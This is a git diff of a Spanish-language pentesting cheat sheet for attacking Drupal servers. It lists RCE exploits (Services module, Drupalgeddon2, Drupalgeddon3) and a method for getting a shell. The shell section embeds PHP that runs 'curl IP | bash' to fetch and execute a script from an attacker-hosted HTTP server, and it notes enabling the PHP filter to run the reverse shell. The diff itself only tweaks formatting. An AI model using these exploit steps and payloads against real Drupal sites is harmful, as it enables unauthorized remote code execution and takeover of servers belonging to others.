@@ -29,7 +29,6 @@ Esta herramienta además de enumerar un servidor Drupal
 ```
 
 ## Exploit PHP
-
 ```bash 
 ❯ Drupal 7.x Module Services - RCE
 
@@ -48,7 +47,6 @@ Notas:
 ```
 
 ## Drupalgeddon2 - RCE 
-
 ```bash 
 # Funciona para las versiones 8.5.x < 8.5.1 / 8.4.x < 8.4.6 / 8.x < 8.3.9 / 7.x < 7.58 / < 6.x
 
@@ -59,7 +57,6 @@ Notas:
 ```
 
 ## Drupalgeddon3 - RCE
-
 ```bash 
 ❯ git clone https://github.com/oways/SA-CORE-2018-004/tree/master      # Clonar el repositorio 
 
@@ -74,13 +71,12 @@ Nota:
 ```
 
 ## Obtener una Shell en Drupal 
-
 ```bash 
 1. Dentro del CMS, crear un articulo y en el cuerpo escribir codigo php y para ejecutar el código se debe dar click en 'Preview'. 
 
 	<?php 
 		system("curl IP | bash ");
-
+	?>
 
 2. Se debe compartir y crear el archivo del recurso en la maquina Kali de la siguiente manera:
 ❯ python3 -m http.server 80
@@ -93,6 +89,5 @@ Nota:
 
 
 Nota:
-	1. Si en el articulo no sale la opción de 'PHP Code' se puede activar en 'Modules > Filter PHP' para que interprete el codigo de la revershell. 
-	2. Terminar el comando de PHP '?>'
+	1. Si en el articulo no sale la opción de 'PHP Code' se puede activar en 'Modules > Filter PHP' para que interprete el codigo de la revershell
 ```
